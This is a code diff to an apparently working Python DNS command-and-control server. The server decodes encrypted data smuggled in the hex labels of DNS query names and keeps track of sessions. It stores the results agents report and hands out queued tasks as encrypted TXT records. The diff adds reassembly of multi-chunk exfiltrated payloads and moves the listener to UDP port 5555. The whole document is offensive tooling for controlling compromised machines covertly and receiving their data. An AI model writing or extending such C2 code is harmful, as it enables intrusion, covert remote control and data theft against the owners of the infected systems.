@@ -8,21 +8,29 @@ KEY = bytes.fromhex(os.getenv("C2_KEY"))  # load key from environment variable
 
 def handle_query(data, addr, sock):
     request = dnslib.DNSRecord.parse(data)
-    qname = str(request.q.qname)          # e.g. "a3f8c2d9.session123.c2.local."
-    
+    qname = str(request.q.qname)   # e.g. "2.chunk1.chunk2.session123.c2.local."
+
     parts = qname.split(".")
-    encrypted_data = bytes.fromhex(parts[0])   # first label = encrypted payload
-    session_id = parts[1]                       # second label = session id
+    chunk_count = int(parts[0])                          # first label = number of data chunks
+    hex_data = "".join(parts[1:1 + chunk_count])         # reassemble hex payload
+    session_id = parts[1 + chunk_count]                  # label right after last chunk
+    encrypted_data = bytes.fromhex(hex_data)
 
     # step 1 — decrypt incoming data
     message = crypto.decrypt(encrypted_data, KEY)
 
-    # step 2 — get next task for this session
-    task = queue_store.get_next_task(session_id)
-    if task is None:
-        task = "WAIT"                      # no tasks queued, tell agent to wait
+    # step 2 — if this is a result report (not a heartbeat), store it
+    if message != "READY" and session_id in queue_store.sessions:
+        last_task = queue_store.sessions[session_id]["last_task"] or ""
+        queue_store.store_result(session_id, last_task, message)
 
-    # step 3 — encrypt task and send back as TXT record
+    # step 3 — get next task for this session
+    if session_id not in queue_store.sessions:
+        task = "WAIT"
+    else:
+        task = queue_store.get_next_task(session_id) or "WAIT"
+
+    # step 4 — encrypt task and send back as TXT record
     encrypted_task = crypto.encrypt(task, KEY)
     reply = request.reply()
     reply.add_answer(dnslib.RR(
@@ -34,10 +42,10 @@ def handle_query(data, addr, sock):
 
 def start_server():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(("0.0.0.0", 53))
-    print("C2 server listening on UDP :53")
+    sock.bind(("0.0.0.0", 5555))
+    print("C2 server listening on UDP :5555")
     while True:
-        data, addr = sock.recvfrom(512)    # 512 bytes = max DNS packet size
+        data, addr = sock.recvfrom(4096)   # 4096 to handle multi-chunk payloads
         handle_query(data, addr, sock)
 
 if __name__ == "__main__":
